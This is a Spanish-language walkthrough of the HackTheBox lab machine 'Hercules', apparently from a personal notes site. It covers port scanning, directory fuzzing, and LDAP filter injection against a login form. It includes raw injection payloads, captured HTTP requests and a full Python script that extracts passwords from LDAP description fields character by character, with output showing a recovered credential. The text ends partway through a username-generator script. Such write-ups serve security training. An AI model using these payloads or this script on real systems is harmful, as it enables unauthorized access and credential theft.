---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Hercules HackTheBox (Insane)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 14:02 EDT
Nmap scan report for 10.10.11.91
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.10.11.91/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-22 18:02:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
62398/tcp open  msrpc         Microsoft Windows RPC
63184/tcp open  msrpc         Microsoft Windows RPC
63308/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-22T18:03:23
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.97 seconds
```

Veremos varios puertos interesantes, entre ellos el de `LDAP, WinRM, IIS, etc...` vemos tambien un `dominio` llamado `hercules.htb` con su `DC` llamado `dc.hercules.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>             hercules.htb dc.hercules.htb
```

Lo guardamos y probamos a meternos por el puerto `443 (HTTPS)` a ver que vemos:

```
URL = https://hercules.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 091502 (1).png" alt=""><figcaption></figcaption></figure>

Vemos una pagina normal aparentemente, por lo que vamos a realizar un poco de `fuzzing` web a ver que vemos.

## Gobuster

```shell
gobuster dir --url https://hercules.htb/ -w <WORDLIST> -x html,php,txt -k -r
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://hercules.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Content              (Status: 403) [Size: 0]
/Default              (Status: 200) [Size: 27342]
/Index                (Status: 200) [Size: 27342]
/Home                 (Status: 200) [Size: 3231]
/Login                (Status: 200) [Size: 3213]
Progress: 11043 / 81876 (13.49%)^C
```

Vemos varios archivos interesantes, pero entre ellos veremos un `Login` que si nos metemos dentro del mismo veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-23 091523.png" alt=""><figcaption></figcaption></figure>

No tenemos ningunas credenciales, pero si probamos algunas veremos que nos pone `Invalid login attempt` por lo que tiene una seguridad de intentos, si capturamos la peticion con `BurpSuite` veremos lo siguiente:

```
POST /Login HTTP/2
Host: hercules.htb
Cookie: __RequestVerificationToken=98VA4J-PMNXzLgYLu06rDkchHVrj6K1fUDy7T5CU3EDzyfOq8koFW_gMdMsuEFc9YugkbRQS8AijbDidIftnlHA5Am0-usfqobLL9cYwabo1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://hercules.htb/Login
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Origin: https://hercules.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

__RequestVerificationToken=M7w2WkxPQfZ1EADuJl0QQaCFP3Rs3SWiXJt5yLkgF93-uij9zLS4hHwil7tawtRiNY1nGfzZy7LiDZDyfKB7qHcCqjDJD2NA1aYTWwhI1zY1&Username=test&Password=test&RememberMe=false
```

Vemos bastante informacion pero nada interesante por el momento, despues de un rato pensando y buscando informacion podremos probar a realizar un `LDAP filter inyection`.

## LDAP filter inyection

LDAP (`Lightweight Directory Access Protocol`) es un protocolo para acceder a servicios de directorio. Se usa comúnmente para autenticación y almacenamiento de información de usuarios.

#### **Sintaxis de Filtros LDAP (RFC 4515)**

* **Filtro básico:** `(atributo=valor)`
* **Comodines:** `(cn=David*)` - nombres que empiezan con "David"
* **Negación:** `(!(cn=David*))` - nombres que NO empiezan con "David"
* **AND:** `(&(cn=D*)(cn=*Smith))` - nombres que empiezan con D Y terminan con Smith
* **OR:** `(|(cn=David*)(cn=Elisa*))` - nombres que empiezan con David O Elisa

Vamos a realizar la `Extracción del atributo "description"` de esta forma:

En el campo de la peticion con `BurpSuite` vamos a poner en el campo llamado `Username` vamos a poner el valor de `*)(&` que es un `payload` de esta tecnica a ver si el `login` se comporta de forma diferente:

```
POST /Login HTTP/2
Host: hercules.htb
Cookie: __RequestVerificationToken=98VA4J-PMNXzLgYLu06rDkchHVrj6K1fUDy7T5CU3EDzyfOq8koFW_gMdMsuEFc9YugkbRQS8AijbDidIftnlHA5Am0-usfqobLL9cYwabo1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://hercules.htb/Login
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Origin: https://hercules.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

__RequestVerificationToken=M7w2WkxPQfZ1EADuJl0QQaCFP3Rs3SWiXJt5yLkgF93-uij9zLS4hHwil7tawtRiNY1nGfzZy7LiDZDyfKB7qHcCqjDJD2NA1aYTWwhI1zY1&Username=*)(&&Password=test&RememberMe=false
```

Si enviamos esto en la respuesta del servidor veremos:

<figure><img src="../../.gitbook/assets/Pasted image 20251022202602.png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta dando otro error distinto ya que pone `Invalid Username` (Esto significa que no esta encontrando coincidencia en `LDAP`) cuando antes se veia el error de `Invalid login attempt` (Que significa que esta encontrando alguna coincidencia o que esta bien formado), por lo que vamos a seguir con la `explotacion` por esta via metiendo el siguiente `payload`.

> Payload

```
test*)(description=*)
```

Esto lo pasaremos en `URL Code` de esta forma:

```
test%252A%2529%2528description%253D%252A
```

Ahora si enviamos esta peticion:

```
POST /Login HTTP/2
Host: hercules.htb
Cookie: __RequestVerificationToken=98VA4J-PMNXzLgYLu06rDkchHVrj6K1fUDy7T5CU3EDzyfOq8koFW_gMdMsuEFc9YugkbRQS8AijbDidIftnlHA5Am0-usfqobLL9cYwabo1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://hercules.htb/Login
Content-Type: application/x-www-form-urlencoded
Content-Length: 216
Origin: https://hercules.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

__RequestVerificationToken=M7w2WkxPQfZ1EADuJl0QQaCFP3Rs3SWiXJt5yLkgF93-uij9zLS4hHwil7tawtRiNY1nGfzZy7LiDZDyfKB7qHcCqjDJD2NA1aYTWwhI1zY1&Username=test%252A%2529%2528description%253D%252A&Password=test&RememberMe=false
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251022203051.png" alt=""><figcaption></figcaption></figure>

Vemos que nos da el mismo error (Esto significa que se esta ejecutando bien, ya que esta comparando el usuario o la descripcion que sea la misma), por lo que no lo esta tomando como algo erroneo, si no, como si fuera un usuario normal, vamos a montarnos un script para probar varios usuarios y ver cuales nos da positivos.

#### **Oracle Booleano - Sistema de Respuestas:**

* **"Login attempt failed"** = **TRUE** (Hubo match)
  * El usuario existe Y la descripción coincide con el patrón
* **"Invalid username"** = **FALSE** (No hubo match)
  * El usuario no existe O la descripción no coincide

#### **Mecanismo de Extracción Carácter por Carácter:**

**Ejemplo:**

1. **Payload:** `test*)(description=a*`
   * Respuesta: "Invalid username" → FALSE → la descripción NO empieza con 'a'
2. **Payload:** `test*)(description=S*`
   * Respuesta: "Login attempt failed" → TRUE → la descripción SÍ empieza con 'S'
3. **Continuar:** `test*)(description=Se*`
   * Hasta reconstruir toda la cadena

> bruteLogin.py

```python
#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time
import sys
from datetime import datetime

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False

# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"

# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

# Extended user list with common patterns and additional users
KNOWN_USERS = [
    # Original users
    "adriana.i", "angelo.o", "ashley.b", "bob.w", "camilla.b", "clarissa.c",
    "elijah.m", "fiona.c", "harris.d", "heather.s", "jacob.b", "jennifer.a",
    "jessica.e", "joel.c", "johanna.f", "johnathan.j", "ken.w", "mark.s",
    "mikayla.a", "natalie.a", "nate.h", "patrick.s", "ramona.l", "ray.n",
    "rene.s", "shae.j", "stephanie.w", "stephen.m", "tanya.r", "tish.c",
    "vincent.g", "will.s", "zeke.s", "auditor",
    
    # Additional common usernames
    "admin", "administrator", "root", "webadmin", "web_admin", "test", 
    "guest", "user", "demo", "backup", "sysadmin", "operator",
    
    # Service accounts
    "svc_ldap", "svc_web", "svc_app", "service_account", "app_user",
    
    # Common naming conventions
    "hercules.admin", "hercules.user", "hercules.audit", "hercules.web",
    "hq.admin", "hq.user", "corp.admin", "corp.user",
    
    # More firstname.lastname patterns
    "alexander.j", "benjamin.t", "charlotte.r", "daniel.m", "emily.w",
    "george.k", "hannah.b", "isaac.l", "julia.m", "kevin.r", "laura.s",
    "michael.b", "nathan.d", "olivia.p", "peter.w", "rachel.k", "samuel.t",
    "victoria.m", "zachary.h",
    
    # IT department common names
    "it.admin", "it.user", "support", "helpdesk", "tech.support",
    
    # Database related
    "dbadmin", "db_user", "sql.admin",
    
    # Network accounts
    "network.admin", "net.support", "sysadmin.net"
]

class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    banner = f"""
{Color.CYAN}{Color.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                   HERCULES LDAP ENUMERATOR                  ║
║                 Advanced Password Extraction                ║
╚══════════════════════════════════════════════════════════════╗
║                    Target: {BASE:<25}       ║
║                    Users:  {len(KNOWN_USERS):<3}                          ║
║                    Started: {datetime.now().strftime('%H:%M:%S')}                    ║
╚══════════════════════════════════════════════════════════════╝
{Color.END}
"""
    print(banner)

def get_token_and_cookie(session):
    """Get fresh CSRF token and cookies with retry mechanism"""
    for attempt in range(3):
        try:
            response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS, timeout=10)
            
            token = None
            match = TOKEN_RE.search(response.text)
            if match:
                token = match.group(1)
                return token
            else:
                print(f"{Color.YELLOW}[!] Attempt {attempt + 1}: Token not found in response{Color.END}")
                time.sleep(1)
        except Exception as e:
            print(f"{Color.RED}[!] Attempt {attempt + 1}: Error getting token - {e}{Color.END}")
            time.sleep(2)
    
    return None

def test_ldap_injection(username, description_prefix=""):
    """Test if description starts with given prefix using LDAP injection"""
    session = requests.Session()
    session.verify = VERIFY_TLS
    
    # Get fresh token
    token = get_token_and_cookie(session)
    if not token:
        return False
    
    # Build LDAP injection payload
    if description_prefix:
        # Escape special characters
        escaped_desc = description_prefix
        if '*' in escaped_desc:
            escaped_desc = escaped_desc.replace('*', '\\2a')
        if '(' in escaped_desc:
            escaped_desc = escaped_desc.replace('(', '\\28')
        if ')' in escaped_desc:
            escaped_desc = escaped_desc.replace(')', '\\29')
        
        payload = f"{username}*)(description={escaped_desc}*"
    else:
        # Check if user has description field
        payload = f"{username}*)(description=*"
    
    # Double URL encode
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
    
    data = {
        "Username": encoded_payload,
        "Password": "test",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': TARGET_URL
    }
    
    try:
        response = session.post(TARGET_URL, data=data, headers=headers, verify=VERIFY_TLS, timeout=10)
        return SUCCESS_INDICATOR in response.text
    except Exception as e:
        return False

def enumerate_description(username):
    """Enumerate description/password field character by character with improved feedback"""
    # Optimized character set based on common password patterns
    charset = (
        string.ascii_lowercase +  # lowercase first (most common)
        string.digits +           # numbers
        string.ascii_uppercase +  # uppercase
        "!@#$%^&*()_-+=[]{}|;:,.<>?/`~\"\\"  # special characters
    )
    
    print(f"{Color.CYAN}[*] Checking user: {username}{Color.END}")
    
    # First check if user has description
    if not test_ldap_injection(username):
        print(f"{Color.YELLOW}[-] User {username} has no description field or not found{Color.END}")
        return None
    
    print(f"{Color.GREEN}[+] User {username} has a description field, enumerating...{Color.END}")
    
    description = ""
    max_length = 100  # Increased for longer passwords
    no_char_count = 0
    start_time = time.time()
    
    for position in range(max_length):
        found = False
        tested_chars = 0
        
        for char in charset:
            test_desc = description + char
            
            if test_ldap_injection(username, test_desc):
                description += char
                elapsed = time.time() - start_time
                print(f"{Color.GREEN}    [{position:2d}] '{char}' -> {description} ({elapsed:.1f}s){Color.END}")
                found = True
                no_char_count = 0
                break
            
            tested_chars += 1
            # Progress indicator for long searches
            if tested_chars % 20 == 0:
                print(f"{Color.BLUE}    Testing... ({tested_chars}/{len(charset)}){Color.END}", end='\r')
            
            # Adaptive delay to avoid rate limiting
            time.sleep(0.05)
        
        if not found:
            no_char_count += 1
            if no_char_count >= 3:  # Stop after 3 consecutive positions with no chars
                print(f"{Color.YELLOW}    No more characters found after {position} positions{Color.END}")
                break
        else:
            # Reset no_char_count when we find a character
            no_char_count = 0
    
    if description:
        total_time = time.time() - start_time
        print(f"{Color.GREEN}[+] Complete: {username} => {description} (in {total_time:.1f}s){Color.END}")
        return description
    
    return None

def load_existing_results():
    """Load already found passwords to avoid re-scanning"""
    try:
        with open("hercules_passwords.txt", "r") as f:
            results = {}
            for line in f:
                if ':' in line:
                    user, pwd = line.strip().split(':', 1)
                    results[user] = pwd
            return results
    except FileNotFoundError:
        return {}

def main():
    print_banner()
    
    # Load existing results
    existing_results = load_existing_results()
    if existing_results:
        print(f"{Color.GREEN}[*] Loaded {len(existing_results)} existing results{Color.END}")
    
    found_passwords = existing_results.copy()
    tested_users = 0
    start_time = datetime.now()
    
    print(f"{Color.WHITE}[*] Testing {len(KNOWN_USERS)} users...{Color.END}")
    print(f"{Color.WHITE}[*] Start time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}{Color.END}")
    print()
    
    # Priority users to test first
    priority_users = ["web_admin", "auditor", "Administrator", "admin", "administrator", 
                     "root", "natalie.a", "ken.w", "hercules.admin", "it.admin"]
    
    # Remove already found users from the list
    users_to_test = [u for u in (priority_users + [u for u in KNOWN_USERS if u not in priority_users]) 
                    if u not in found_passwords]
    
    print(f"{Color.CYAN}[*] {len(users_to_test)} users remaining to test{Color.END}")
    
    # Test users
    for user in users_to_test:
        tested_users += 1
        remaining = len(users_to_test) - tested_users
        elapsed = (datetime.now() - start_time).total_seconds() / 60
        
        print(f"{Color.WHITE}\n[*] Progress: {tested_users}/{len(users_to_test)} "
              f"(Elapsed: {elapsed:.1f}m, Remaining: {remaining}){Color.END}")
        
        password = enumerate_description(user)
        
        if password:
            found_passwords[user] = password
            
            # Save results immediately
            with open("hercules_passwords.txt", "a") as f:
                f.write(f"{user}:{password}\n")
            
            print(f"{Color.GREEN}{Color.BOLD}\n[+] FOUND CREDENTIALS: {user}:{password}{Color.END}\n")
        
        # Brief pause between users
        time.sleep(1)
    
    # Final summary
    total_time = (datetime.now() - start_time).total_seconds() / 60
    
    print(f"\n{Color.CYAN}{Color.BOLD}" + "="*70)
    print("ENUMERATION COMPLETE")
    print("="*70 + f"{Color.END}")
    
    print(f"{Color.WHITE}[*] Total time: {total_time:.1f} minutes")
    print(f"[*] Users tested: {tested_users}")
    print(f"[*] Credentials found: {len(found_passwords)}{Color.END}")
    
    if found_passwords:
        print(f"\n{Color.GREEN}{Color.BOLD}[+] DISCOVERED CREDENTIALS:{Color.END}")
        for user, pwd in sorted(found_passwords.items()):
            print(f"{Color.GREEN}  {user:<25} : {pwd}{Color.END}")
        
        # Save final summary
        with open("hercules_summary.txt", "w") as f:
            f.write(f"Hercules LDAP Enumeration Summary\n")
            f.write(f"Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total time: {total_time:.1f} minutes\n")
            f.write(f"Credentials found: {len(found_passwords)}\n\n")
            for user, pwd in sorted(found_passwords.items()):
                f.write(f"{user}:{pwd}\n")
        
        print(f"\n{Color.CYAN}[*] Results saved to: hercules_passwords.txt")
        print(f"[*] Summary saved to: hercules_summary.txt{Color.END}")
    else:
        print(f"\n{Color.RED}[-] No passwords found{Color.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Script interrupted by user{Color.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Color.RED}[!] Unexpected error: {e}{Color.END}")
        sys.exit(1)
```

Antes de ejecutar esto vamos a explicar que hace exactamente todo esto.

```
# ¿La descripción empieza con "H"?
Payload: usuario*)(description=H*
Filtro: (&(username=usuario*)(description=H*)(password=x))

# Si respuesta = "Login attempt failed" → SÍ empieza con H

# ¿La descripción empieza con "He"?
Payload: usuario*)(description=He*  
Filtro: (&(username=usuario*)(description=He*)(password=x))

# Si respuesta = "Login attempt failed" → SÍ empieza con He
```

Y asi continuamente, utilizamos el error `Login attempt failed` como `TRUE` podremos llegar a obtener con el usuario correcto la descripcion entera del propoio usuario a nivel de `LDAP`.

> NOTA: Para ello tendremos que poner muchos usuarios que creamos que pueden ser del dominio de la maquina victima.

Vamos a ejecutarlo de la siguiente forma:

```shell
python3 bruteLogin.py
```

Info:

```
╔══════════════════════════════════════════════════════════════╗
║                   HERCULES LDAP ENUMERATOR                  ║
║                 Advanced Password Extraction                ║
╚══════════════════════════════════════════════════════════════╗
║                    Target: https://hercules.htb            ║
║                    Users:  89                           ║
║                    Started: 14:48:20                    ║
╚══════════════════════════════════════════════════════════════╝


[*] Testing 89 users...
[*] Start time: 2025-10-22 14:48:20

[*] 90 users remaining to test

[*] Progress: 1/90 (Elapsed: 0.0m, Remaining: 89)
[*] Checking user: web_admin
[-] User web_admin has no description field or not found
.............................<RESTO_DE_CODIGO>.....................................
[*] Progress: 26/90 (Elapsed: 0.6m, Remaining: 64)                                                                                                           
[*] Checking user: johnathan.j
[+] User johnathan.j has a description field, enumerating...
    [ 0] 'c' -> c (0.7s)
    [ 1] 'h' -> ch (2.8s)
    [ 2] 'a' -> cha (3.0s)
    [ 3] 'n' -> chan (6.7s)
    [ 4] 'g' -> chang (8.6s)
    [ 5] 'e' -> change (9.9s)
    [ 6] '*' -> change* (29.7s)
    [ 7] 't' -> change*t (34.9s)
    [ 8] 'h' -> change*th (36.8s)
    [ 9] '1' -> change*th1 (44.6s)
    [10] 's' -> change*th1s (49.8s)
    [11] '_' -> change*th1s_ (70.8s)
    [12] 'p' -> change*th1s_p (77.4s)
    [13] '@' -> change*th1s_p@ (98.2s)
    [14] 's' -> change*th1s_p@s (103.1s)
    [15] 's' -> change*th1s_p@ss (108.2s)
    [16] 'w' -> change*th1s_p@ssw (115.6s)
    [17] '(' -> change*th1s_p@ssw( (134.8s)
    [18] ')' -> change*th1s_p@ssw() (153.6s)
    [19] 'r' -> change*th1s_p@ssw()r (158.3s)
    [20] 'd' -> change*th1s_p@ssw()rd (159.3s)
    [21] '!' -> change*th1s_p@ssw()rd! (175.4s)
    [22] '!' -> change*th1s_p@ssw()rd!! (192.7s)
    No more characters found after 25 positions
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!! (in 274.6s)

[+] FOUND CREDENTIALS: johnathan.j:change*th1s_p@ssw()rd!!
.............................<RESTO_DE_CODIGO>.....................................
======================================================================
ENUMERATION COMPLETE                                                                                                                                         
======================================================================                                                                                       
[*] Total time: 6.6 minutes
[*] Users tested: 90                                                                                                                                         
[*] Credentials found: 1                                                                                                                                     

[+] DISCOVERED CREDENTIALS:
  johnathan.j               : change*th1s_p@ssw()rd!!

[*] Results saved to: hercules_passwords.txt
[*] Summary saved to: hercules_summary.txt
```

Veremos que ha funcionado con el usuario `johnathan.j` pero si probamos las credenciales con el `login` no va a funcionar, por lo que vamos a probar a enumerar usuarios con `netexec` partiendo de esa contraseña.

## Netexec

Vamos antes a crearnos un listado de usuarios con un script de `python3`.

> generateUsers.py

```python
#!/usr/bin/env python3
"""
Generador Simple de Usuarios Active Directory
Formato: nombre.inicial_apellido
"""

import random

class SimpleADUserGenerator:
    def __init__(self):
        # Lista masiva de nombres reales de todo el mundo
        self.first_names = [
            # Español/Latino
            'Juan', 'Carlos', 'Miguel', 'José', 'Luis', 'Javier', 'Francisco', 'Antonio', 'David', 'Daniel',
            'Alejandro', 'Manuel', 'Pedro', 'Rafael', 'Jorge', 'Sergio', 'Fernando', 'Pablo', 'Ángel', 'Diego',
            'María', 'Carmen', 'Ana', 'Isabel', 'Laura', 'Elena', 'Lucía', 'Sara', 'Paula', 'Cristina',
            'Andrea', 'Teresa', 'Rosa', 'Marta', 'Sandra', 'Patricia', 'Raquel', 'Nuria', 'Angela', 'Eva',
            
            # Inglés/Internacional
            'John', 'James', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles',
            'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Paul', 'Steven', 'Andrew', 'Kenneth', 'Joshua',
            'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen',
            'Nancy', 'Lisa', 'Margaret', 'Betty', 'Sandra', 'Ashley', 'Dorothy', 'Kimberly', 'Emily', 'ken', 'Donna',
            
            # Francés
            'Pierre', 'Jean', 'Michel', 'Philippe', 'Alain', 'Nicolas', 'Patrick', 'Daniel', 'David', 'Thomas',
            'Marie', 'Nathalie', 'Isabelle', 'Sylvie', 'Catherine', 'Françoise', 'Monique', 'Christine', 'Martine', 'Nicole',
            
            # Alemán
            'Thomas', 'Michael', 'Andreas', 'Stefan', 'Christian', 'Martin', 'Wolfgang', 'Klaus', 'Hans', 'Peter',
            'Maria', 'Ursula', 'Monika', 'Petra', 'Andrea', 'Karin', 'Sabine', 'Angelika', 'Birgit', 'Elke',
            
            # Italiano
            'Marco', 'Alessandro', 'Luca', 'Giovanni', 'Francesco', 'Andrea', 'Matteo', 'Riccardo', 'Davide', 'Gabriele',
            'Maria', 'Anna', 'Giuseppina', 'Rosa', 'Angela', 'Giovanna', 'Teresa', 'Lucia', 'Barbara', 'Francesca',
            
            # Portugués
            'João', 'Pedro', 'António', 'José', 'Francisco', 'Carlos', 'Luís', 'Miguel', 'Rui', 'Paulo',
            'Maria', 'Ana', 'Teresa', 'Joana', 'Carla', 'Sandra', 'Diana', 'Patrícia', 'Helena', 'Lurdes',
            
            # Árabe
            'Mohammed', 'Ahmed', 'Ali', 'Omar', 'Youssef', 'Khaled', 'Hassan', 'Ibrahim', 'Mahmoud', 'Mustafa',
            'Fatima', 'Aisha', 'Mariam', 'Zainab', 'Layla', 'Nour', 'Yasmin', 'Rania', 'Hana', 'Samira',
            
            # Ruso
            'Alexander', 'Sergey', 'Dmitry', 'Andrey', 'Alexey', 'Mikhail', 'Vladimir', 'Ivan', 'Nikolai', 'Pavel',
            'Elena', 'Olga', 'Natalia', 'Irina', 'Svetlana', 'Maria', 'Anna', 'Tatiana', 'Yulia', 'Ekaterina',
            
            # Indio
            'Raj', 'Amit', 'Sanjay', 'Vikram', 'Arjun', 'Rahul', 'Deepak', 'Anil', 'Sunil', 'Ravi',
            'Priya', 'Anjali', 'Sunita', 'Kavita', 'Neha', 'Pooja', 'Sonia', 'Ritu', 'Divya', 'Shilpa',
            
            # Chino
            'Wei', 'Jie', 'Lei', 'Feng', 'Jun', 'Tao', 'Yang', 'Xiong', 'Jin', 'Qiang',
            'Mei', 'Li', 'Xia', 'Jing', 'Yan', 'Ling', 'Hui', 'Fang', 'Ying', 'Qian',
            
            # Japonés
            'Hiroshi', 'Takashi', 'Yuki', 'Haruto', 'Ren', 'Sota', 'Yuto', 'Kaito', 'Satoshi', 'Daichi',
            'Yuki', 'Sakura', 'Aoi', 'Yui', 'Hina', 'Miyu', 'Riko', 'Koharu', 'Mei', 'Saki',
            
            # Latinoamérica adicional
            'Santiago', 'Mateo', 'Sebastián', 'Leonardo', 'Thiago', 'Gabriel', 'Dante', 'Luca', 'Matías', 'Emiliano',
            'Sofía', 'Valentina', 'Isabella', 'Camila', 'Valeria', 'Ximena', 'Mariana', 'Gabriela', 'Daniela', 'Lucía'
        ]
        
        # Iniciales de apellido (de la A a la Z)
        self.last_initials = [
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
        ]
        
        # Cuentas comunes del sistema
        self.common_accounts = [
            'administrator', 'admin', 'root', 'webadmin', 'sysadmin', 'operator',
            'svc_ldap', 'svc_web', 'svc_app', 'service', 'backup', 'test',
            'user', 'guest', 'demo', 'temp', 'support', 'helpdesk',
            'sqladmin', 'dbadmin', 'oracle', 'mysql', 'postgres',
            'network', 'netadmin', 'security', 'audit', 'monitor',
